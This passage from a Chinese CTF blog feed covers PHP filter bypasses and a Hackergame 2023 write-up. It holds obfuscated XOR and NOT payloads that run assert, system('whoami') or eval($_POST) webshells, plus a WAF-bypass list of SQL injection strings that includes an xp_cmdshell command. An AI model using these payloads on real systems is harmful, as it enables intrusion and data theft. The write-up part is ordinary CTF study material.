class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%07&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%5d&#x27;</span>);</span><br><span class="line"><span class="comment">//$__=&#x27;_GET&#x27;;</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line"><span class="comment">//$___=&#x27;$_GET&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br><span class="line"><span class="comment">//assert($_GET[_]);</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7c&#x27;</span>);<span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%07&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%5d&#x27;</span>);<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);&amp;_=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure><p>当过滤字符的范围没有那么大，或者只是过滤关键字的时候可以使用如下脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">char = string.printable</span><br><span class="line">cmd = <span class="string">&#x27;system&#x27;</span></span><br><span class="line">tmp1,tmp2 = <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> res <span class="keyword">in</span> cmd:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> char:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> char:</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j) == <span class="built_in">ord</span>(res)):</span><br><span class="line">                tmp1 += i</span><br><span class="line">                tmp2 += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;(&#x27;&#123;&#125;&#x27;^&#x27;&#123;&#125;&#x27;)&quot;</span>.<span class="built_in">format</span>(tmp1,tmp2))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; php -r &quot;var_dump(&#x27;000000&#x27;^&#x27;CICDU]&#x27;);&quot;</span><br><span class="line">Command line code:1:</span><br><span class="line">string(6) &quot;system&quot;</span><br></pre></td></tr></table></figure><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210113191434628.png?raw=true" alt="在这里插入图片描述"></p><p>再放个网上看到的 payload:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line"><span class="comment">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span></span><br></pre></td></tr></table></figure><h2 id="url编码取反绕过"><a class="markdownIt-Anchor" href="#url编码取反绕过">#</a> <strong>URL 编码取反绕过</strong></h2><p>还是上面的例题</p><p>当 PHP&gt;=7 时，可以直接利用取反构造 payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; php -r &quot;var_dump(urlencode(~&#x27;phpinfo&#x27;));&quot;</span><br><span class="line">Command line code:1:</span><br><span class="line">string(21) &quot;%8F%97%8F%96%91%99%90&quot;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>)();</span><br><span class="line"><span class="comment">#phpinfo();</span></span><br></pre></td></tr></table></figure><p>这里给一个 php 的转化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="string">&#x27;(eval($_POST[mochu7]))&#x27;</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$d</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=(~%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B)(~%D7%<span class="number">9</span>A%<span class="number">89</span>%<span class="number">9</span>E%<span class="number">93</span>%D7%DB%A0%AF%B0%AC%AB%A4%<span class="number">92</span>%<span class="number">90</span>%<span class="number">9</span>C%<span class="number">97</span>%<span class="number">8</span>A%C8%A2%D6%D6);  <span class="comment">//别忘了后面的分号</span></span><br><span class="line">或者：</span><br><span class="line">?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[%<span class="number">27</span>a%<span class="number">27</span>])</span><br></pre></td></tr></table></figure><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/2021011322442091.png?raw=true" alt="在这里插入图片描述"></p><p>有参数的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; php -r &quot;var_dump(urlencode(~&#x27;system&#x27;));&quot;</span><br><span class="line">Command line code:1:</span><br><span class="line">string(18) &quot;%8C%86%8C%8B%9A%92&quot;</span><br><span class="line">PS C:\Users\Administrator&gt; php -r &quot;var_dump(urlencode(~&#x27;whoami&#x27;));&quot;</span><br><span class="line">Command line code:1:</span><br><span class="line">string(18) &quot;%88%97%90%9E%92%96&quot;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">88</span>%<span class="number">97</span>%<span class="number">90</span>%<span class="number">9</span>E%<span class="number">92</span>%<span class="number">96</span>);</span><br><span class="line"><span class="comment">#system(&#x27;whoami&#x27;);</span></span><br></pre></td></tr></table></figure><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210113225437499.png?raw=true" alt="在这里插入图片描述"></p><h2 id="如何绕过waf"><a class="markdownIt-Anchor" href="#如何绕过waf">#</a> <strong>如何绕过 WAF</strong></h2><p>\1. 当我们在目标 URL 进行 SQL 注入测试时，可以通过修改注入语句中字母的大小写来触发 WAF 保护情况。如果 WAF 使用区分大小写的黑名单，则更改大小写可能会帮我们成功绕过 WAF 的过滤。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.xxxxx.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4</span><br></pre></td></tr></table></figure><p>\2. 关键字替换 (在关键字中间可插入将会被 WAF 过滤的字符) – 例如 SELECT 可插入变成 SEL</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.xxxxx.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4</span><br></pre></td></tr></table></figure><p>\3. 编码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+ URL encode</span><br><span class="line">　　page.php?id=1%252f%252a*/UNION%252f%252a /SELECT +Hex encode</span><br><span class="line">　　www.xxxxx.com/index.php?page_id=-15 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4…  　SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61)) +Unicode encode</span><br><span class="line">　　?id=10%D6‘%20AND%2201=2%23   　SELECT &#x27;?&#x27;=&#x27;A&#x27;; #1</span><br></pre></td></tr></table></figure><p>\4. 使用注释</p><p>在攻击字符串中插入注释。例如，/<em>!SELECT</em>/ 这样 WAF 可能就会忽略该字符串，但它仍会被传递给目标应用程序并交由 mysql 数据库处理。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4　   　&#x27;union%a0select pass from users#  index.php?page_id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3   　?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4…</span><br></pre></td></tr></table></figure><p>\5. 某些函数或<a href="https://www.linuxcool.com/">命令</a>，因为 WAF 的过滤机制导致我们无法使用。那么，我们也可以尝试用一些等价函数来替代它们。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hex()、bin() ==&gt; ascii()   sleep() ==&gt;benchmark()   concat_ws()==&gt;group_concat()  substr((select &#x27;password&#x27;),1,1) = 0x70   　strcmp(left(&#x27;password&#x27;,1), 0x69) = 1      strcmp(left(&#x27;password&#x27;,1), 0x70) = 0   　strcmp(left(&#x27;password&#x27;,1), 0x71) = -1 mid()、substr() ==&gt; substring()  @@user ==&gt; user()  @@datadir ==&gt; datadir()</span><br></pre></td></tr></table></figure><p>\6. 使用特殊符号</p><p>这里我把非字母数字的字符都规在了特殊符号一类，特殊符号有特殊的含义和用法。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+ ` symbol: select `version()`; + +- :select+id-1+1.from users; + @:select@^1.from users; +Mysql function() as xxx +`、~、!、@、%、()、[]、.、-、+ 、|、%00 示例</span><br><span class="line">　　‘se’+’lec’+’t’   %S%E%L%E%C%T 1   1.aspx?id=1;EXEC(‘ma’+&#x27;ster..x’+&#x27;p_cm’+&#x27;dsh’+&#x27;ell ”net user”’)  &#x27; or --+2=- -!!!&#x27;2    　 id=1+(UnI)(oN)+(SeL)(EcT)</span><br></pre></td></tr></table></figure><p>\7. HTTP 参数控制<br>　　<br>通过提供多个参数 = 相同名称的值集来混淆 WAF。例如 <a href="http://www.xxxxx.com?id=1&amp;?id=%E2%80%99">http://www.xxxxx.com?id=1&amp;?id=’</a> or ‘1’=’1′ — ‘在某些情况下 (例如使用 Apache/PHP)，应用程序将仅解析最后 (第二个) id= 而 WAF 只解析第一个。在应用程序看来这似乎是一个合法的请求，因此应用程序会接收并处理这些恶意输入。如今，大多数的 WAF 都不会受到 HTTP 参数污染 (HPP) 的影响，但仍然值得一试。</p><p>+ HPP(HTTP Parameter Polution))</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">　　/?id=1;select+1,2,3+from+users+where+id=1—   　/?id=1;select+1&amp;id=2,3+from+users+where+id=1—   　/?id=1/**/union/*&amp;id=*/select/*&amp;id=*/pwd/*&amp;id=*/from/*&amp;id=*/users</span><br></pre></td></tr></table></figure><p>HPP 又称做重复参数污染，最简单的就是？uid=1&amp;uid=2&amp;uid=3，对于这种情况，不同的 Web 服务器处理方式如下：</p><p>+HPF (HTTP Parameter Fragment)</p><p>这种方法是 HTTP 分割注入，同 CRLF 有相似之处 (使用控制字符 %0a、%0d 等执行换行)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users--   select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users—</span><br></pre></td></tr></table></figure><p>+HPC (HTTP Parameter Contamination)<br> RFC2396 定义了以下字符：<br> <code>Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * ' () Reserved : ; / ? : @ &amp; = + $ , Unwise : &#123; &#125; | \ ^ [ ] </code>  ` 不同的 Web 服务器处理处理构造得特殊请求时有不同的逻辑：以魔术字符 % 为例，Asp/Asp.net 会受到影响。</p><p>\8. 缓冲区溢出</p><p>WAF 和其他所有的应用程序一样也存在着各种缺陷和漏洞。如果出现缓冲区溢出的情况，那么 WAF 可能就会崩溃，即使不能代码执行那也会使 WAF 无法正常运行。这样，WAF 的安全防护自然也就被瓦解了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</span><br></pre></td></tr></table></figure><p>\9. 整合绕过</p><p>当使用单一的方式无法绕过时，我们则可以灵活的将多种方式结合在一起尝试。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www.xxxxx.com/index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 &quot;A&quot;)..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4…   id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()– -   ?id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e--</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hackergame-2023</title>
      <link href="/2023/11/12/Hackergame-2023/"/>
      <url>/2023/11/12/Hackergame-2023/</url>
      
        <content type="html"><![CDATA[<h2 id="hackergame-启动"><a class="markdownIt-Anchor" href="#hackergame-启动">#</a> <strong>Hackergame 启动</strong></h2><p>​利用 burpsuite 拦截发送相似度的报文，对相似度修改为 100 即可。</p><h2 id="猫咪小测"><a class="markdownIt-Anchor" href="#猫咪小测">#</a> <strong>猫咪小测</strong></h2><p>第一问搜索得值中科大中外书籍存在西区图书馆 12 楼，第二问在 arXiv 上搜索 chick 即可，当然也可以暴力，第三问 gpt 或者 CSDN，第四问 Google 搜索关键词 python typing check,halting problem, 检索 2023 年的文献即可得到 ECOOP 为会议。</p><h2 id="更深更暗"><a class="markdownIt-Anchor" href="#更深更暗">#</a> <strong>更深更暗</strong></h2><p>直接在浏览器 F12 和 ctrl+f 搜索 flag 即可</p><h2 id="旅行照片"><a class="markdownIt-Anchor" href="#旅行照片">#</a> <strong>旅行照片</strong></h2><p>根据图片或奖得主锁定东京大学，google 即可的出东京大学诺贝尔奖得主信息。</p><p>再实景地图找公园，锁定活动在 googl 找到相关线上志愿报名，门票钱搜索可知东京大学学生免费。</p><h2 id="赛博井字棋"><a class="markdownIt-Anchor" href="#赛博井字棋">#</a> <strong>赛博井字棋</strong></h2><p>burpsuite 抓包发现下的棋子通过 x 和 y 定位，在棋盘本身不能下到电脑下过的地方，试一下修改 x,y 值到电脑下过的地方，发现覆盖，即可获胜。</p><h2 id="奶奶睡前的flag"><a class="markdownIt-Anchor" href="#奶奶睡前的flag">#</a> <strong>奶奶睡前的 flag</strong></h2><p>这道题之前做过类似的似乎（虽然我做的题很少很少，但还是想起来最近某次比赛一道没做出来的 MISC 里有这么一道，当时是 windows 的 snipping tools 的 bug），遂搜索，发现 google 手机也能利用这个漏洞，在 github 上翻出源码，执行选择最老的 google 手机即可获取 flag。<br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/1.png?raw=true" alt="600"></p><p>通过抓包获取撤回信息的格式，直接上脚本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># 定义基本的 URL 和请求头</span><br><span class="line">BASE_URL = &quot;http://202.38.93.111:10021&quot;</span><br><span class="line">HEADERS = &#123;</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36&quot;,</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/json&quot;,</span><br><span class="line">    &quot;Origin&quot;: &quot;http://202.38.93.111:10021&quot;,</span><br><span class="line">    &quot;Referer&quot;: &quot;http://202.38.93.111:10021/&quot;,</span><br><span class="line">    &quot;Cookie&quot;: &quot;session=eyJ0b2tlbiI6IjQ1MzpNRVVDSUJ3ZE1jd1RURkR2RlZwSGFRcXE0Tm94bzBSdnVGRDZzdExFNTJHOU42NlNBaUVBOEdXWGRXY1orN2pIeXFneUxxQTIyWDZDc2RoY3ZLblVPNjNjemFLMy8xUT0ifQ.ZTz5oQ.59uj_HyyOdElcS6oMKyqOq2koDo&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 获取消息</span><br><span class="line">def get_messages():</span><br><span class="line">    response = requests.post(f&quot;&#123;BASE_URL&#125;/api/getMessages&quot;, headers=HEADERS)</span><br><span class="line">    if response.status_code == 200:</span><br><span class="line">        return response.json()</span><br><span class="line">    return []</span><br><span class="line"></span><br><span class="line"># 删除消息</span><br><span class="line">def delete_message(message_id):</span><br><span class="line">    payload = &#123;&quot;id&quot;: message_id&#125;</span><br><span class="line">    response = requests.post(f&quot;&#123;BASE_URL&#125;/api/deleteMessage&quot;, headers=HEADERS, json=payload)</span><br><span class="line">    if response.status_code == 200:</span><br><span class="line">        print(&quot;delete message: &quot;,message_id,&#x27; &#x27;, response.text,&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">def get_flag():</span><br><span class="line">    response = requests.post(f&quot;&#123;BASE_URL&#125;/api/getflag&quot;, headers=HEADERS)</span><br><span class="line">    if response.status_code == 200:</span><br><span class="line">        return response.text</span><br><span class="line">    return None</span><br><span class="line"># 主执行逻辑</span><br><span class="line">start_time = time.time()</span><br><span class="line">messages = get_messages()</span><br><span class="line">print(messages)</span><br><span class="line">i = 0 </span><br><span class="line">lastmessage = &#x27;&#x27;</span><br><span class="line">for message in messages[&#x27;messages&#x27;]:</span><br><span class="line">    match = re.search(r&#x27;hack\[[a-z]+\]&#x27;, message[&#x27;text&#x27;])</span><br><span class="line">    </span><br><span class="line">    if match:</span><br><span class="line">        while(1):</span><br><span class="line">            # print(i)</span><br><span class="line">            end_time = time.time()</span><br><span class="line">            if end_time - start_time &gt; message[&#x27;delay&#x27;] :</span><br><span class="line">                delete_message(i)  # 这里假设每个消息还有一个&#x27;id&#x27;字段。如果没有，你需要根据实际情况进行调整。</span><br><span class="line">                break</span><br><span class="line">    print(&#x27; &#x27;,message,&#x27;\n&#x27;)</span><br><span class="line">    i = i + 1</span><br><span class="line">    lastmessage=message</span><br><span class="line">time.sleep(7)</span><br><span class="line">flag = get_flag()</span><br><span class="line">print(&quot;Received flag:&quot;, flag)</span><br></pre></td></tr></table></figure><p>这里有个坑是发送时间不能在 delay 的时间之前发送，会显示<strong>时空错误</strong>，另外完成后要等待 7 秒左右再连接 getflag 接口，否则还是告诉你出错。</p><h2 id="虫"><a class="markdownIt-Anchor" href="#虫">#</a> <strong>虫</strong></h2><p>这道题要根据文字提示，告诉你这种方式可以接受 ISS 的图片，之后上网搜索，得值通过 SSTV 的方式获取 ISS 定时发送的图片。下载音频后下载相关的软件即可，这里由于声音较为刺耳，下载了虚拟音频驱动来播放（怕被室友打），第一次费好大劲下的 MMSSTV 还用不了，我还以为思路错了，之后用 RXSSTV 即可成功获取 flag。</p><h2 id="json-属于-yaml"><a class="markdownIt-Anchor" href="#json-属于-yaml">#</a> <strong>JSON 属于 YAML？</strong></h2><p>搜索即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag1: &#123;&#x27;value&#x27;:1e233&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag2: &#123;&#x27;va&#x27;:1,&#x27;va&#x27;:2&#125;</span><br></pre></td></tr></table></figure><h2 id="http集邮册"><a class="markdownIt-Anchor" href="#http集邮册">#</a> <strong>HTTP 集邮册</strong></h2><p>获取状态吗：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /file HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n</span><br><span class="line">Range: bytes=5000-10000\r\n\r\n</span><br><span class="line"></span><br><span class="line">416 Requested Range Not Satisfiable</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n</span><br><span class="line">Range: bytes=0-999\r\n\r\n</span><br><span class="line"></span><br><span class="line">206 Partial Content</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /index.html HTTP/1.1</span><br><span class="line">Host</span><br><span class="line"></span><br><span class="line">400 Bad Request</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.html HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n\r\n</span><br><span class="line"></span><br><span class="line">405 Not Allowed</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /index.html HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n</span><br><span class="line">Content-Length: 10000000\r\n</span><br><span class="line">\r\n</span><br><span class="line">&#123;appl&#125;</span><br><span class="line"></span><br><span class="line">413 Request Entity Too Large</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /index.html HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n</span><br><span class="line">EXPECT: 100-continue\r\n</span><br><span class="line">\r\n</span><br><span class="line"></span><br><span class="line">100 Continue</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /verylongpath/...[repeat many times]... HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n\r\n</span><br><span class="line"></span><br><span class="line">414 URI Too Long </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/2.1\r\n</span><br><span class="line">Host: www.example.com\r\n\r\n</span><br><span class="line"></span><br><span class="line">505 HTTP Version Not Supported</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n\r\n</span><br><span class="line"></span><br><span class="line">200 OK</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /thispagedoesnotexist HTTP/1.1\r\n</span><br><span class="line">Host: www.baidu.com\r\n\r\n</span><br><span class="line"></span><br><span class="line">404 Not Found</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n</span><br><span class="line">If-Modified-Since: Tue, 15 Aug 2023 17:03:04 GMT\r\n\r\n</span><br><span class="line"></span><br><span class="line">304 Not Modified</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n</span><br><span class="line">If-Match: 121\r\n\r\n</span><br><span class="line"></span><br><span class="line">412 Precondition Failed</span><br></pre></td></tr></table></figure><h2 id="docker-for-everyone"><a class="markdownIt-Anchor" href="#docker-for-everyone">#</a> <strong>Docker for Everyone</strong></h2><p>题目给出了提示，通过 docker 提权即可，再启动 docker 时 -------- 之后 cat 软连接即可</p><h2 id="惜字如金"><a class="markdownIt-Anchor" href="#惜字如金">#</a> <strong>惜字如金</strong></h2><p>需要写脚本暴力，代码给出提示，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">check_equals(set(len(s) for s in code_dict), &#123;24&#125;)</span><br></pre></td></tr></table></figure><p>每个有 24 个字符，而上面经过惜字如金处理之后为 23 个，故暴力出所有可能即可。</p><p>上代码：（写的不好，这里纯纯自己手打获取的所有可能</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">my_str = &#x27;nymeh1niwemflcir&#125;echaet&#x27;</span><br><span class="line">index = 0</span><br><span class="line">strs1 = []</span><br><span class="line">vowels = set(&quot;AEIOUaeiou&quot;)</span><br><span class="line"></span><br><span class="line">for s in my_str:</span><br><span class="line">    if s not in vowels:</span><br><span class="line">        new_str = my_str[:index] + s + my_str[index:]</span><br><span class="line">        strs1.append(new_str)</span><br><span class="line">    index += 1</span><br><span class="line"></span><br><span class="line"># for str1 in strs1:</span><br><span class="line">#     print(str1)</span><br><span class="line">strs1.append(&#x27;nymeh1niwemflcir&#125;echaete&#x27;)</span><br><span class="line">print(strs1)</span><br><span class="line"></span><br><span class="line">my_str2 = &#x27;a3g7&#125;kidgojernoetlsup?h&#x27;</span><br><span class="line">index = 0</span><br><span class="line">strs2 = []</span><br><span class="line">vowels = set(&quot;AEIOUaeiou&quot;)</span><br><span class="line"></span><br><span class="line">for s in my_str2:</span><br><span class="line">    if s not in vowels:</span><br><span class="line">        new_str = my_str2[:index] + s + my_str2[index:]</span><br><span class="line">        strs2.append(new_str)</span><br><span class="line">    index += 1</span><br><span class="line"></span><br><span class="line"># for str1 in strs1:</span><br><span class="line">#     print(str1)</span><br><span class="line">strs2.append(&#x27;a3g7&#125;kidgojernoetlsup?he&#x27;)</span><br><span class="line">strs2.append(&#x27;a3g7&#125;kidgojernoetlsupe?h&#x27;)</span><br><span class="line">print(strs2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">my_str3 = &#x27;ulw!f5soadrhwnrsnstnoeq&#x27;</span><br><span class="line">index = 0</span><br><span class="line">strs3 = []</span><br><span class="line">vowels = set(&quot;AEIOUaeiou&quot;)</span><br><span class="line"></span><br><span class="line">for s in my_str3:</span><br><span class="line">    if s not in vowels:</span><br><span class="line">        new_str = my_str3[:index] + s + my_str3[index:]</span><br><span class="line">        strs3.append(new_str)</span><br><span class="line">    index += 1</span><br><span class="line"></span><br><span class="line"># for str1 in strs1:</span><br><span class="line">#     print(str1)</span><br><span class="line">strs3.append(&#x27;ulwe!f5soadrhwnrsnstnoeq&#x27;)</span><br><span class="line">strs3.append(&#x27;ulw!f5soadrhwnrsnstnoeqe&#x27;)</span><br><span class="line">print(strs3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">my_str4 = &#x27;ct&#123;l-findiehaai&#123;oveatas&#x27;</span><br><span class="line">index = 0</span><br><span class="line">strs4 = []</span><br><span class="line">vowels = set(&quot;AEIOUaeiou&quot;)</span><br><span class="line"></span><br><span class="line">for s in my_str4:</span><br><span class="line">    if s not in vowels:</span><br><span class="line">        new_str = my_str4[:index] + s + my_str4[index:]</span><br><span class="line">        strs4.append(new_str)</span><br><span class="line">    index += 1</span><br><span class="line"></span><br><span class="line"># for str1 in strs1:</span><br><span class="line">#     print(str1)</span><br><span class="line">strs4.append(&#x27;cte&#123;l-findiehaai&#123;oveatas&#x27;)</span><br><span class="line">strs4.append(&#x27;ct&#123;le-findiehaai&#123;oveatas&#x27;)</span><br><span class="line">strs4.append(&#x27;ct&#123;l-findiehaai&#123;oveatase&#x27;)</span><br><span class="line">print(strs4)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">my_str5 = &#x27;ty9kxborszstguyd?!blm-p&#x27;</span><br><span class="line">index = 0</span><br><span class="line">strs5 = []</span><br><span class="line">vowels = set(&quot;AEIOUaeiou&quot;)</span><br><span class="line"></span><br><span class="line">for s in my_str5:</span><br><span class="line">    if s not in vowels:</span><br><span class="line">        new_str = my_str5[:index] + s + my_str5[index:]</span><br><span class="line">        strs5.append(new_str)</span><br><span class="line">    index += 1</span><br><span class="line"></span><br><span class="line"># for str1 in strs1:</span><br><span class="line">#     print(str1)</span><br><span class="line">strs5.append(&#x27;tye9kxborszstguyd?!blm-p&#x27;)</span><br><span class="line">strs5.append(&#x27;ty9kxborszstguyde?!blm-p&#x27;)</span><br><span class="line">strs5.append(&#x27;ty9kxborszstguyd?!blme-p&#x27;)</span><br><span class="line">strs5.append(&#x27;ty9kxborszstguyd?!blm-pe&#x27;)</span><br><span class="line">print(strs5)</span><br><span class="line">print(len(strs5))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>暴力即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"></span><br><span class="line"># Th siz of th fil may reduc after XZRJification</span><br><span 